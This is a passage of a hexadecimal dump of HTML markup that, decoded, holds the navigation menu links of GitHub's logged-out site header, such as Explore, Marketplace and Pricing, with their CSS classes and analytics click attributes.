0002b10 6e69 2d6b 7267 7961 6e20 2d6f 6e75 6564
0002b20 6c72 6e69 2065 3566 2022 6164 6174 672d
0002b30 2d61 6c63 6369 3d6b 2822 6f4c 6767 6465
0002b40 6f20 7475 2029 6548 6461 7265 202c 6f67
0002b50 7420 206f 6341 6974 6e6f 2273 413e 7463
0002b60 6f69 736e 2f3c 3e61 200a 2020 2020 2020
0002b70 2020 2020 2020 2020 2020 2020 2020 3c20
0002b80 696c 6320 616c 7373 223d 6465 6567 692d
0002b90 6574 2d6d 6966 2278 3c3e 2061 7268 6665
0002ba0 223d 662f 6165 7574 6572 2373 6574 6d61
0002bb0 6d2d 6e61 6761 6d65 6e65 2274 6320 616c
0002bc0 7373 223d 7970 322d 6c20 2d68 6f63 646e
0002bd0 6e65 6573 2d64 6c75 7274 2061 2d64 6c62
0002be0 636f 206b 696c 6b6e 672d 6172 2079 6f6e
0002bf0 752d 646e 7265 696c 656e 6620 2235 6420
0002c00 7461 2d61 6167 632d 696c 6b63 223d 4c28
0002c10 676f 6567 2064 756f 2974 4820 6165 6564
0002c20 2c72 6720 206f 6f74 5420 6165 206d 616d
0002c30 616e 6567 656d 746e 3e22 6554 6d61 6d20
0002c40 6e61 6761 6d65 6e65 3c74 612f 3c3e 6c2f
0002c50 3e69 200a 2020 2020 2020 2020 2020 2020
0002c60 2020 2020 2020 2020 3c20 696c 6320 616c
0002c70 7373 223d 6465 6567 692d 6574 2d6d 6966
0002c80 2278 3c3e 2061 7268 6665 223d 662f 6165
0002c90 7574 6572 2373 6f73 6963 6c61 632d 646f
0002ca0 6e69 2267 6320 616c 7373 223d 7970 322d
0002cb0 6c20 2d68 6f63 646e 6e65 6573 2d64 6c75
0002cc0 7274 2061 2d64 6c62 636f 206b 696c 6b6e
0002cd0 672d 6172 2079 6f6e 752d 646e 7265 696c
0002ce0 656e 6620 2235 6420 7461 2d61 6167 632d
0002cf0 696c 6b63 223d 4c28 676f 6567 2064 756f
0002d00 2974 4820 6165 6564 2c72 6720 206f 6f74
0002d10 5320 636f 6169 206c 6f63 6964 676e 3e22
0002d20 6f53 6963 6c61 6320 646f 6e69 3c67 612f
0002d30 3c3e 6c2f 3e69 200a 2020 2020 2020 2020
0002d40 2020 2020 2020 2020 2020 2020 3c20 696c
0002d50 6320 616c 7373 223d 6465 6567 692d 6574
0002d60 2d6d 6966 2278 3c3e 2061 7268 6665 223d
0002d70 662f 6165 7574 6572 2373 6f64 7563 656d
0002d80 746e 7461 6f69 226e 6320 616c 7373 223d
0002d90 7970 322d 6c20 2d68 6f63 646e 6e65 6573
0002da0 2d64 6c75 7274 2061 2d64 6c62 636f 206b
0002db0 696c 6b6e 672d 6172 2079 6f6e 752d 646e
0002dc0 7265 696c 656e 6620 2235 6420 7461 2d61
0002dd0 6167 632d 696c 6b63 223d 4c28 676f 6567
0002de0 2064 756f 2974 4820 6165 6564 2c72 6720
0002df0 206f 6f74 4420 636f 6d75 6e65 6174 6974
0002e00 6e6f 3e22 6f44 7563 656d 746e 7461 6f69
0002e10 3c6e 612f 3c3e 6c2f 3e69 200a 2020 2020
0002e20 2020 2020 2020 2020 2020 2020 2020 2020
0002e30 3c20 696c 6320 616c 7373 223d 6465 6567
0002e40 692d 6574 2d6d 6966 2278 3c3e 2061 7268
0002e50 6665 223d 662f 6165 7574 6572 2373 6f63
0002e60 6564 682d 736f 6974 676e 2022 6c63 7361
0002e70 3d73 7022 2d79 2032 686c 632d 6e6f 6564
0002e80 736e 6465 752d 746c 6172 6420 622d 6f6c
0002e90 6b63 6c20 6e69 2d6b 7267 7961 6e20 2d6f
0002ea0 6e75 6564 6c72 6e69 2065 3566 2022 6164
0002eb0 6174 672d 2d61 6c63 6369 3d6b 2822 6f4c
0002ec0 6767 6465 6f20 7475 2029 6548 6461 7265
0002ed0 202c 6f67 7420 206f 6f43 6564 6820 736f
0002ee0 6974 676e 3e22 6f43 6564 6820 736f 6974
0002ef0 676e 2f3c 3e61 2f3c 696c 0a3e 2020 2020
0002f00 2020 2020 2020 2020 2020 2020 2020 2020
0002f10 2f3c 6c75 0a3e 200a 2020 2020 2020 2020
0002f20 2020 2020 2020 2020 2020 3c20 6c75 6320
0002f30 616c 7373 223d 696c 7473 732d 7974 656c
0002f40 6e2d 6e6f 2065 626d 302d 6220 726f 6564
0002f50 2d72 676c 742d 706f 7020 2d74 676c 332d
0002f60 3e22 200a 2020 2020 2020 2020 2020 2020
0002f70 2020 2020 2020 2020 3c20 696c 6320 616c
0002f80 7373 223d 6465 6567 692d 6574 2d6d 6966
0002f90 2278 3c3e 2061 7268 6665 223d 632f 7375
0002fa0 6f74 656d 2d72 7473 726f 6569 2273 6320
0002fb0 616c 7373 223d 7970 322d 6c20 2d68 6f63
0002fc0 646e 6e65 6573 2d64 6c75 7274 2061 2d64
0002fd0 6c62 636f 206b 6f6e 752d 646e 7265 696c
0002fe0 656e 6c20 6e69 2d6b 7267 7961 642d 7261
0002ff0 206b 6f6e 752d 646e 7265 696c 656e 6820
0003000 2035 7542 706d 6c2d 6e69 2d6b 682d 766f
0003010 7265 2022 6164 6174 672d 2d61 6c63 6369
0003020 3d6b 2822 6f4c 6767 6465 6f20 7475 2029
0003030 6548 6461 7265 202c 6f67 7420 206f 7543
0003040 7473 6d6f 7265 7320 6f74 6972 7365 3e22
0003050 7543 7473 6d6f 7265 7320 6f74 6972 7365
0003060 3c20 7073 6e61 6320 616c 7373 223d 7542
0003070 706d 6c2d 6e69 2d6b 7973 626d 6c6f 6620
0003080 6f6c 7461 722d 6769 7468 7420 7865 2d74
0003090 6f6e 6d72 6c61 7420 7865 2d74 7267 7961
00030a0 6c2d 6769 7468 3e22 7226 7261 3b72 2f3c
00030b0 7073 6e61 3c3e 612f 3c3e 6c2f 3e69 200a
00030c0 2020 2020 2020 2020 2020 2020 2020 2020
00030d0 2020 2020 3c20 696c 6320 616c 7373 223d
00030e0 6465 6567 692d 6574 2d6d 6966 2278 3c3e
00030f0 2061 7268 6665 223d 732f 6365 7275 7469
0003100 2279 6320 616c 7373 223d 7970 322d 6c20
0003110 2d68 6f63 646e 6e65 6573 2d64 6c75 7274
0003120 2061 2d64 6c62 636f 206b 6f6e 752d 646e
0003130 7265 696c 656e 6c20 6e69 2d6b 7267 7961
0003140 642d 7261 206b 6f6e 752d 646e 7265 696c
0003150 656e 6820 2035 7542 706d 6c2d 6e69 2d6b
0003160 682d 766f 7265 2022 6164 6174 672d 2d61
0003170 6c63 6369 3d6b 2822 6f4c 6767 6465 6f20
0003180 7475 2029 6548 6461 7265 202c 6f67 7420
0003190 206f 6553 7563 6972 7974 3e22 6553 7563
00031a0 6972 7974 3c20 7073 6e61 6320 616c 7373
00031b0 223d 7542 706d 6c2d 6e69 2d6b 7973 626d
00031c0 6c6f 6620 6f6c 7461 722d 6769 7468 7420
00031d0 7865 2d74 6f6e 6d72 6c61 7420 7865 2d74
00031e0 7267 7961 6c2d 6769 7468 3e22 7226 7261
00031f0 3b72 2f3c 7073 6e61 3c3e 612f 3c3e 6c2f
0003200 3e69 200a 2020 2020 2020 2020 2020 2020
0003210 2020 2020 2020 3c20 752f 3e6c 200a 2020
0003220 2020 2020 2020 2020 2020 2020 2020 3c20
0003230 642f 7669 0a3e 2020 2020 2020 2020 2020
0003240 2020 2020 2020 2f3c 6564 6174 6c69 3e73
0003250 200a 2020 2020 2020 2020 2020 2020 3c20
0003260 6c2f 3e69 200a 2020 2020 2020 2020 2020
0003270 2020 3c20 696c 6320 616c 7373 223d 6d20
0003280 2d72 2033 726d 6c2d 2d67 2233 0a3e 2020
0003290 2020 2020 2020 2020 2020 2020 2020 613c
00032a0 6820 6572 3d66 2f22 6e65 6574 7072 6972
00032b0 6573 2022 6c63 7361 3d73 4822 6165 6564
00032c0 4d72 6e65 2d75 696c 6b6e 6e20 2d6f 6e75
00032d0 6564 6c72 6e69 2065 7970 332d 6420 622d
00032e0 6f6c 6b63 6420 6c2d 2d67 6e69 696c 656e
00032f0 622d 6f6c 6b63 2022 6164 6174 672d 2d61
0003300 6c63 6369 3d6b 2822 6f4c 6767 6465 6f20
0003310 7475 2029 6548 6461 7265 202c 6f67 7420
0003320 206f 6e45 6574 7072 6972 6573 3e22 6e45
0003330 6574 7072 6972 6573 2f3c 3e61 200a 2020
0003340 2020 2020 2020 2020 2020 3c20 6c2f 3e69
0003350 0a0a 2020 2020 2020 2020 2020 2020 2020
0003360 6c3c 2069 6c63 7361 3d73 2022 726d 332d
0003370 6d20 2d72 676c 332d 6520 6764 2d65 7469
0003380 6d65 662d 7869 7020 736f 7469 6f69 2d6e
0003390 6572 616c 6974 6576 6620 656c 2d78 7277
00033a0 7061 6620 656c 2d78 756a 7473 6669 2d79
00033b0 6562 7774 6565 206e 2d64 6c66 7865 6620
00033c0 656c 2d78 7469 6d65 2d73 6563 746e 7265
00033d0 2220 0a3e 2020 2020 2020 2020 2020 2020
00033e0 2020 2020 643c 7465 6961 736c 6320 616c
00033f0 7373 223d 6548 6461 7265 654d 756e 642d
0003400 7465 6961 736c 6420 7465 6961 736c 6f2d
0003410 6576 6c72 7961 6420 7465 6961 736c 722d
0003420 7365 7465 7720 6469 6874 662d 6c75 226c
0003430 0a3e 2020 2020 2020 2020 2020 2020 2020
0003440 2020 2020 733c 6d75 616d 7972 6320 616c
0003450 7373 223d 6548 6461 7265 654d 756e 732d
0003460 6d75 616d 7972 4820 6165 6564 4d72 6e65
0003470 2d75 696c 6b6e 7020 2d78 2030 7970 332d
0003480 6220 726f 6564 2d72 2030 6f6e 772d 6172
0003490 2070 6420 692d 6c6e 6e69 2d65 6c62 636f
00034a0 226b 0a3e 2020 2020 2020 2020 2020 2020
00034b0 2020 2020 2020 2020 7845 6c70 726f 0a65
00034c0 2020 2020 2020 2020 2020 2020 2020 2020
00034d0 2020 2020 733c 6776 7820 223d 7030 2278
00034e0 7920 223d 7030 2278 7620 6569 4277 786f
00034f0 223d 2030 2030 3431 3820 2022 6d78 3a6c
0003500 7073 6361 3d65 7022 6572 6573 7672 2265
0003510 6620 6c69 3d6c 6e22 6e6f 2265 6320 616c
0003520 7373 223d 6369 6e6f 632d 6568 6f76 2d6e
0003530 6f64 6e77 6d2d 746b 2067 6f70 6973 6974
0003540 6e6f 722d 6c65 7461 7669 2265 0a3e 2020
0003550 2020 2020 2020 2020 2020 2020 2020 2020
0003560 2020 2020 703c 7461 2068 3d64 4d22 2c31
0003570 6c31 2e36 2c32 4c36 3331 312c 3e22 2f3c
0003580 6170 6874 0a3e 2020 2020 2020 2020 2020
0003590 2020 2020 2020 2020 2020 2f3c 7673 3e67
00035a0 200a 2020 2020 2020 2020 2020 2020 2020
00035b0 2020 3c20 732f 6d75 616d 7972 0a3e 200a
00035c0 2020 2020 2020 2020 2020 2020 2020 2020
00035d0 3c20 6964 2076 6c63 7361 3d73 6422 6f72
00035e0 6470 776f 2d6e 656d 756e 6620 656c 2d78
00035f0 7561 6f74 7220 756f 646e 6465 312d 6220
0003600 2d67 6877 7469 2065 7870 302d 7020 2d74
0003610 2032 6270 302d 6d20 2d74 2030 7020 342d
0003620 6c20 6665 2d74 346e 7020 736f 7469 6f69
0003630 2d6e 6261 6f73 756c 6574 3e22 200a 2020
0003640 2020 2020 2020 2020 2020 2020 2020 2020
0003650 3c20 6c75 6320 616c 7373 223d 696c 7473
0003660 732d 7974 656c 6e2d 6e6f 2065 626d 332d
0003670 3e22 200a 2020 2020 2020 2020 2020 2020
0003680 2020 2020 2020 2020 3c20 696c 6320 616c
0003690 7373 223d 6465 6567 692d 6574 2d6d 6966
00036a0 2278 3c3e 2061 7268 6665 223d 652f 7078
00036b0 6f6c 6572 2022 6c63 7361 3d73 7022 2d79
00036c0 2032 686c 632d 6e6f 6564 736e 6465 752d
00036d0 746c 6172 6420 622d 6f6c 6b63 6c20 6e69
00036e0 2d6b 7267 7961 642d 7261 206b 6f6e 752d
00036f0 646e 7265 696c 656e 6820 2035 7542 706d
0003700 6c2d 6e69 2d6b 682d 766f 7265 2022 6164
0003710 6174 672d 2d61 6c63 6369 3d6b 2822 6f4c
0003720 6767 6465 6f20 7475 2029 6548 6461 7265
0003730 202c 6f67 7420 206f 7845 6c70 726f 2265
0003740 453e 7078 6f6c 6572 4720 7469 7548 2062
0003750 733c 6170 206e 6c63 7361 3d73 4222 6d75
0003760 2d70 696c 6b6e 732d 6d79 6f62 206c 6c66
0003770 616f 2d74 6972 6867 2074 6574 7478 6e2d
0003780 726f 616d 206c 6574 7478 672d 6172 2d79
0003790 696c 6867 2274 263e 6172 7272 3c3b 732f
00037a0 6170 3e6e 2f3c 3e61 2f3c 696c 0a3e 2020
00037b0 2020 2020 2020 2020 2020 2020 2020 2020
00037c0 2020 2f3c 6c75 0a3e 200a 2020 2020 2020
00037d0 2020 2020 2020 2020 2020 2020 3c20 3468
00037e0 6320 616c 7373 223d 6574 7478 672d 6172
00037f0 2d79 696c 6867 2074 6574 7478 6e2d 726f
0003800 616d 206c 6574 7478 6d2d 6e6f 206f 3566
0003810 6d20 2d62 2032 6220 726f 6564 2d72 6f74
0003820 2070 7470 332d 3e22 654c 7261 206e 6126
0003830 706d 203b 6f63 746e 6972 7562 6574 2f3c
0003840 3468 0a3e 2020 2020 2020 2020 2020 2020
0003850 2020 2020 2020 2020 753c 206c 6c63 7361
0003860 3d73 6c22 7369 2d74 7473 6c79 2d65 6f6e
0003870 656e 6d20 2d62 2233 0a3e 2020 2020 2020
0003880 2020 2020 2020 2020 2020 2020 2020 2020
0003890 6c3c 2069 6c63 7361 3d73 6522 6764 2d65
00038a0 7469 6d65 662d 7869 3e22 613c 6820 6572
00038b0 3d66 2f22 6f74 6970 7363 2022 6c63 7361
00038c0 3d73 7022 2d79 2032 686c 632d 6e6f 6564
00038d0 736e 6465 752d 746c 6172 6420 622d 6f6c
00038e0 6b63 6c20 6e69 2d6b 7267 7961 6e20 2d6f
00038f0 6e75 6564 6c72 6e69 2065 3566 2022 6164
0003900 6174 672d 2d61 6c63 6369 3d6b 2822 6f4c
0003910 6767 6465 6f20 7475 2029 6548 6461 7265
0003920 202c 6f67 7420 206f 6f54 6970 7363 3e22
0003930 6f54 6970 7363 2f3c 3e61 2f3c 696c 0a3e
0003940 2020 2020 2020 2020 2020 2020 2020 2020
0003950 2020 2020 2020 2020 6c3c 2069 6c63 7361
0003960 3d73 6522 6764 2d65 7469 6d65 662d 7869
0003970 3e22 613c 6820 6572 3d66 2f22 6f63 6c6c
0003980 6365 6974 6e6f 2273 6320 616c 7373 223d
0003990 7970 322d 6c20 2d68 6f63 646e 6e65 6573
00039a0 2d64 6c75 7274 2061 2d64 6c62 636f 206b
00039b0 696c 6b6e 672d 6172 2079 6f6e 752d 646e
00039c0 7265 696c 656e 6620 2235 6420 7461 2d61
00039d0 6167 632d 696c 6b63 223d 4c28 676f 6567
00039e0 2064 756f 2974 4820 6165 6564 2c72 6720
00039f0 206f 6f74 4320 6c6f 656c 7463 6f69 736e
0003a00 3e22 6f43 6c6c 6365 6974 6e6f 3c73 612f
0003a10 3c3e 6c2f 3e69 200a 2020 2020 2020 2020
0003a20 2020 2020 2020 2020 2020 2020 3c20 696c
0003a30 6320 616c 7373 223d 6465 6567 692d 6574
0003a40 2d6d 6966 2278 3c3e 2061 7268 6665 223d
0003a50 742f 6572 646e 6e69 2267 6320 616c 7373
0003a60 223d 7970 322d 6c20 2d68 6f63 646e 6e65
0003a70 6573 2d64 6c75 7274 2061 2d64 6c62 636f
0003a80 206b 696c 6b6e 672d 6172 2079 6f6e 752d
0003a90 646e 7265 696c 656e 6620 2235 6420 7461
0003aa0 2d61 6167 632d 696c 6b63 223d 4c28 676f
0003ab0 6567 2064 756f 2974 4820 6165 6564 2c72
0003ac0 6720 206f 6f74 5420 6572 646e 6e69 2267
0003ad0 543e 6572 646e 6e69 3c67 612f 3c3e 6c2f
0003ae0 3e69 200a 2020 2020 2020 2020 2020 2020
0003af0 2020 2020 2020 2020 3c20 696c 6320 616c
0003b00 7373 223d 6465 6567 692d 6574 2d6d 6966
0003b10 2278 3c3e 2061 7268 6665 223d 7468 7074
0003b20 3a73 2f2f 616c 2e62 6967 6874 6275 632e
0003b30 6d6f 222f 6320 616c 7373 223d 7970 322d
0003b40 6c20 2d68 6f63 646e 6e65 6573 2d64 6c75
0003b50 7274 2061 2d64 6c62 636f 206b 696c 6b6e
0003b60 672d 6172 2079 6f6e 752d 646e 7265 696c
0003b70 656e 6620 2235 6420 7461 2d61 6167 632d
0003b80 696c 6b63 223d 4c28 676f 6567 2064 756f
0003b90 2974 4820 6165 6564 2c72 6720 206f 6f74
0003ba0 4c20 6165 6e72 6e69 2067 616c 2262 4c3e
0003bb0 6165 6e72 6e69 2067 614c 3c62 612f 3c3e
0003bc0 6c2f 3e69 200a 2020 2020 2020 2020 2020
0003bd0 2020 2020 2020 2020 2020 3c20 696c 6320
0003be0 616c 7373 223d 6465 6567 692d 6574 2d6d
0003bf0 6966 2278 3c3e 2061 7268 6665 223d 7468
0003c00 7074 3a73 2f2f 706f 6e65 6f73 7275 6563
0003c10 672e 6975 6564 2022 6c63 7361 3d73 7022
0003c20 2d79 2032 686c 632d 6e6f 6564 736e 6465
0003c30 752d 746c 6172 6420 622d 6f6c 6b63 6c20
0003c40 6e69 2d6b 7267 7961 6e20 2d6f 6e75 6564
0003c50 6c72 6e69 2065 3566 2022 6164 6174 672d
0003c60 2d61 6c63 6369 3d6b 2822 6f4c 6767 6465
0003c70 6f20 7475 2029 6548 6461 7265 202c 6f67
0003c80 7420 206f 704f 6e65 7320 756f 6372 2065
0003c90 7567 6469 7365 3e22 704f 6e65 7320 756f
0003ca0 6372 2065 7567 6469 7365 2f3c 3e61 2f3c
0003cb0 696c 0a3e 2020 2020 2020 2020 2020 2020
0003cc0 2020 2020 2020 2020 2f3c 6c75 0a3e 200a
0003cd0 2020 2020 2020 2020 2020 2020 2020 2020
0003ce0 2020 3c20 3468 6320 616c 7373 223d 6574
0003cf0 7478 672d 6172 2d79 696c 6867 2074 6574
0003d00 7478 6e2d 726f 616d 206c 6574 7478 6d2d
0003d10 6e6f 206f 3566 6d20 2d62 2032 6220 726f
0003d20 6564 2d72 6f74 2070 7470 332d 3e22 6f43
0003d30 6e6e 6365 2074 6977 6874 6f20 6874 7265
0003d40 3c73 682f 3e34 200a 2020 2020 2020 2020
0003d50 2020 2020 2020 2020 2020 3c20 6c75 6320
0003d60 616c 7373 223d 696c 7473 732d 7974 656c
0003d70 6e2d 6e6f 2065 626d 302d 3e22 200a 2020
0003d80 2020 2020 2020 2020 2020 2020 2020 2020
0003d90 2020 3c20 696c 6320 616c 7373 223d 6465
0003da0 6567 692d 6574 2d6d 6966 2278 3c3e 2061
0003db0 7268 6665 223d 7468 7074 3a73 2f2f 6967
0003dc0 6874 6275 632e 6d6f 652f 6576 746e 2273
0003dd0 6320 616c 7373 223d 7970 322d 6c20 2d68
0003de0 6f63 646e 6e65 6573 2d64 6c75 7274 2061
0003df0 2d64 6c62 636f 206b 696c 6b6e 672d 6172
0003e00 2079 6f6e 752d 646e 7265 696c 656e 6620
0003e10 2235 6420 7461 2d61 6167 632d 696c 6b63
0003e20 223d 4c28 676f 6567 2064 756f 2974 4820
0003e30 6165 6564 2c72 6720 206f 6f74 4520 6576
0003e40 746e 2273 453e 6576 746e 3c73 612f 3c3e
0003e50 6c2f 3e69 200a 2020 2020 2020 2020 2020
0003e60 2020 2020 2020 2020 2020 3c20 696c 6320
0003e70 616c 7373 223d 6465 6567 692d 6574 2d6d
0003e80 6966 2278 3c3e 2061 7268 6665 223d 7468
0003e90 7074 3a73 2f2f 6967 6874 6275 632e 6d6f
0003ea0 756d 696e 7974 2022 6c63 7361 3d73 7022
0003eb0 2d79 2032 686c 632d 6e6f 6564 736e 6465
0003ec0 752d 746c 6172 6420 622d 6f6c 6b63 6c20
0003ed0 6e69 2d6b 7267 7961 6e20 2d6f 6e75 6564
0003ee0 6c72 6e69 2065 3566 2022 6164 6174 672d
0003ef0 2d61 6c63 6369 3d6b 2822 6f4c 6767 6465
0003f00 6f20 7475 2029 6548 6461 7265 202c 6f67
0003f10 7420 206f 6f43 6d6d 6e75 7469 2079 6f66
0003f20 7572 226d 433e 6d6f 756d 696e 7974 6620
0003f30 726f 6d75 2f3c 3e61 2f3c 696c 0a3e 2020
0003f40 2020 2020 2020 2020 2020 2020 2020 2020
0003f50 2020 2020 6c3c 2069 6c63 7361 3d73 6522
0003f60 6764 2d65 7469 6d65 662d 7869 3e22 613c
0003f70 6820 6572 3d66 6822 7474 7370 2f3a 652f
0003f80 7564 6163 6974 6e6f 672e 7469 7568 2e62
0003f90 6f63 226d 6320 616c 7373 223d 7970 322d
0003fa0 7020 2d62 2030 686c 632d 6e6f 6564 736e
0003fb0 6465 752d 746c 6172 6420 622d 6f6c 6b63
0003fc0 6c20 6e69 2d6b 7267 7961 6e20 2d6f 6e75
0003fd0 6564 6c72 6e69 2065 3566 2022 6164 6174
0003fe0 672d 2d61 6c63 6369 3d6b 2822 6f4c 6767
0003ff0 6465 6f20 7475 2029 6548 6461 7265 202c
0004000 6f67 7420 206f 6947 4874 6275 4520 7564
0004010 6163 6974 6e6f 3e22 6947 4874 6275 4520
0004020 7564 6163 6974 6e6f 2f3c 3e61 2f3c 696c
0004030 0a3e 2020 2020 2020 2020 2020 2020 2020
0004040 2020 2020 2020 2f3c 6c75 0a3e 2020 2020
0004050 2020 2020 2020 2020 2020 2020 2020 2f3c
0004060 6964 3e76 200a 2020 2020 2020 2020 2020
0004070 2020 2020 3c20 642f 7465 6961 736c 0a3e
0004080 2020 2020 2020 2020 2020 2020 2020 2f3c
0004090 696c 0a3e 200a 2020 2020 2020 2020 2020
00040a0 2020 3c20 696c 6320 616c 7373 223d 6d20
00040b0 2d72 2033 726d 6c2d 2d67 2233 0a3e 2020
00040c0 2020 2020 2020 2020 2020 2020 2020 613c
00040d0 6820 6572 3d66 2f22 616d 6b72 7465 6c70
00040e0 6361 2265 6320 616c 7373 223d 6548 6461
00040f0 7265 654d 756e 6c2d 6e69 206b 6f6e 752d
0004100 646e 7265 696c 656e 7020 2d79 2033 2d64
0004110 6c62 636f 206b 2d64 676c 692d 6c6e 6e69
0004120 2d65 6c62 636f 226b 6420 7461 2d61 6167
0004130 632d 696c 6b63 223d 4c28 676f 6567 2064
0004140 756f 2974 4820 6165 6564 2c72 6720 206f
0004150 6f74 4d20 7261 656b 7074 616c 6563 3e22
0004160 614d 6b72 7465 6c70 6361 3c65 612f 0a3e
0004170 2020 2020 2020 2020 2020 2020 2020 2f3c
0004180 696c 0a3e 200a 2020 2020 2020 2020 2020
0004190 2020 3c20 696c 6320 616c 7373 223d 6d20
00041a0 2d72 2033 726d 6c2d 2d67 2033 6465 6567
00041b0 692d 6574 2d6d 6966 2078 6f70 6973 6974
00041c0 6e6f 722d 6c65 7461 7669 2065 6c66 7865
00041d0 772d 6172 2070 6c66 7865 6a2d 7375 6974
00041e0 7966 622d 7465 6577 6e65 6420 662d 656c
00041f0 2078 6c66 7865 692d 6574 736d 632d 6e65
0004200 6574 2072 3e22 200a 2020 2020 2020 2020
0004210 2020 2020 2020 3c20 6564 6174 6c69 2073
0004220 6c63 7361 3d73 4822 6165 6564 4d72 6e65
0004230 2d75 6564 6174 6c69 2073 6564 6174 6c69
0004240 2d73 766f 7265 616c 2079 6564 6174 6c69
0004250 2d73 6572 6573 2074 6977 7464 2d68 7566
0004260 6c6c 3e22 200a 2020 2020 2020 2020 2020
0004270 2020 2020 2020 3c20 7573 6d6d 7261 2079
0004280 6c63 7361 3d73 4822 6165 6564 4d72 6e65
0004290 2d75 7573 6d6d 7261 2079 6548 6461 7265
00042a0 654d 756e 6c2d 6e69 206b 7870 302d 7020
00042b0 2d79 2033 6f62 6472 7265 302d 6e20 2d6f
00042c0 7277 7061 2020 2d64 6e69 696c 656e 622d
00042d0 6f6c 6b63 3e22 200a 2020 2020 2020 2020
00042e0 2020 2020 2020 2020 2020 5020 6972 6963
00042f0 676e 200a 2020 2020 2020 2020 2020 2020
0004300 2020 2020 2020 3c20 7673 2067 3d78 3022
0004310 7870 2022 3d79 3022 7870 2022 6976 7765
0004320 6f42 3d78 3022 3020 3120 2034 2238 7820
0004330 6c6d 733a 6170 6563 223d 7270 7365 7265
0004340 6576 2022 6966 6c6c 223d 6f6e 656e 2022
0004350 6c63 7361 3d73 6922 6f63 2d6e 6863 7665
0004360 6e6f 642d 776f 2d6e 6b6d 6774 7020 736f
0004370 7469 6f69 2d6e 6572 616c 6974 6576 3e22
0004380 200a 2020 2020 2020 2020 2020 2020 2020
0004390 2020 2020 2020 2020 703c 7461 2068 3d64
00043a0 4d22 2c31 6c31 2e36 2c32 4c36 3331 312c
00043b0 3e22 2f3c 6170 6874 0a3e 2020 2020 2020
00043c0 2020 2020 2020 2020 2020 2020 2020 2f3c
00043d0 7673 3e67 200a 2020 2020 2020 2020 2020
00043e0 2020 2020 2020 3c20 732f 6d75 616d 7972
00043f0 0a3e 200a 2020 2020 2020 2020 2020 2020
0004400 2020 2020 3c20 6964 2076 6c63 7361 3d73
0004410 6422 6f72 6470 776f 2d6e 656d 756e 6620
0004420 656c 2d78 7561 6f74 7220 756f 646e 6465
0004430 312d 6220 2d67 6877 7469 2065 7870 302d
0004440 7020 2d74 2032 6270 342d 6d20 2d74 2030
0004450 7020 342d 6c20 6665 2d74 346e 7020 736f
0004460 7469 6f69 2d6e 6261 6f73 756c 6574 3e22
0004470 200a 2020 2020 2020 2020 2020 2020 2020
0004480 2020 2020 3c20 2061 7268 6665 223d 702f
0004490 6972 6963 676e 2022 6c63 7361 3d73 7022
00044a0 2d62 2032 686c 632d 6e6f 6564 736e 6465
00044b0 752d 746c 6172 6420 622d 6f6c 6b63 6c20
00044c0 6e69 2d6b 7267 7961 642d 7261 206b 6f6e
00044d0 752d 646e 7265 696c 656e 6820 2035 7542
00044e0 706d 6c2d 6e69 2d6b 682d 766f 7265 2022
00044f0 6164 6174 672d 2d61 6c63 6369 3d6b 2822
0004500 6f4c 6767 6465 6f20 7475 2029 6548 6461
0004510 7265 202c 6f67 7420 206f 7250 6369 6e69
0004520 2267 503e 616c 736e 3c20 7073 6e61 6320
0004530 616c 7373 223d 7542 706d 6c2d 6e69 2d6b
0004540 7973 626d 6c6f 6620 6f6c 7461 722d 6769
0004550 7468 7420 7865 2d74 6f6e 6d72 6c61 7420
0004560 7865 2d74 7267 7961 6c2d 6769 7468 3e22
0004570 7226 7261 3b72 2f3c 7073 6e61 3c3e 612f
0004580 0a3e 200a 2020 2020 2020 2020 2020 2020
0004590 2020 2020 2020 3c20 6c75 6320 616c 7373
00045a0 223d 696c 7473 732d 7974 656c 6e2d 6e6f
00045b0 2065 626d 332d 3e22 200a 2020 2020 2020
00045c0 2020 2020 2020 2020 2020 2020 2020 3c20
00045d0 696c 6320 616c 7373 223d 6465 6567 692d
00045e0 6574 2d6d 6966 2278 3c3e 2061 7268 6665
00045f0 223d 702f 6972 6963 676e 6623 6165 7574
0004600 6572 632d 6d6f 6170 6972 6f73 226e 6320
0004610 616c 7373 223d 7970 322d 6c20 2d68 6f63
0004620 646e 6e65 6573 2d64 6c75 7274 2061 2d64
0004630 6c62 636f 206b 696c 6b6e 672d 6172 2079
0004640 6f6e 752d 646e 7265 696c 656e 6620 2235
0004650 6420 7461 2d61 6167 632d 696c 6b63 223d
0004660 4c28 676f 6567 2064 756f 2974 4820 6165
0004670 6564 2c72 6720 206f 6f74 4320 6d6f 6170
0004680 6572 7020 616c 736e 3e22 6f43 706d 7261
0004690 2065 6c70 6e61 3c73 612f 3c3e 6c2f 3e69
00046a0 200a 2020 2020 2020 2020 2020 2020 2020
00046b0 2020 2020 2020 3c20 696c 6320 616c 7373
00046c0 223d 6465 6567 692d 6574 2d6d 6966 2278
00046d0 3c3e 2061 7268 6665 223d 7468 7074 3a73
00046e0 2f2f 6e65 6574 7072 6972 6573 672e 7469
00046f0 7568 2e62 6f63 2f6d 6f63 746e 6361 2274
0004700 6320 616c 7373 223d 7970 322d 6c20 2d68
0004710 6f63 646e 6e65 6573 2d64 6c75 7274 2061
0004720 2d64 6c62 636f 206b 696c 6b6e 672d 6172
0004730 2079 6f6e 752d 646e 7265 696c 656e 6620
0004740 2235 6420 7461 2d61 6167 632d 696c 6b63
0004750 223d 4c28 676f 6567 2064 756f 2974 4820
0004760 6165 6564 2c72 6720 206f 6f74 4320 6e6f
0004770 6174 7463 5320 6c61 7365 3e22 6f43 746e
0004780 6361 2074 6153 656c 3c73 612f 3c3e 6c2f
0004790 3e69 200a 2020 2020 2020 2020 2020 2020
00047a0 2020 2020 2020 3c20 752f 3e6c 0a0a 2020
00047b0 2020 2020 2020 2020 2020 2020 2020 2020
00047c0 2020 753c 206c 6c63 7361 3d73 6c22 7369
00047d0 2d74 7473 6c79 2d65 6f6e 656e 6d20 2d62
00047e0 2030 6220 726f 6564 2d72 6f74 2070 7470
00047f0 332d 3e22 200a 2020 2020 2020 2020 2020
0004800 2020 2020 2020 2020 2020 3c20 696c 6320
0004810 616c 7373 223d 6465 6567 692d 6574 2d6d
0004820 6966 2278 3c3e 2061 7268 6665 223d 6e2f
0004830 6e6f 7270 666f 7469 2022 6c63 7361 3d73
0004840 7022 2d79 2032 686c 632d 6e6f 6564 736e
0004850 6465 752d 746c 6172 6420 622d 6f6c 6b63
0004860 6e20 2d6f 6e75 6564 6c72 6e69 2065 696c
0004870 6b6e 672d 6172 2d79 6164 6b72 6e20 2d6f
0004880 6e75 6564 6c72 6e69 2065 3568 4220 6d75
0004890 2d70 696c 6b6e 2d2d 6f68 6576 2272 6420
00048a0 7461 2d61 6167 632d 696c 6b63 223d 4c28
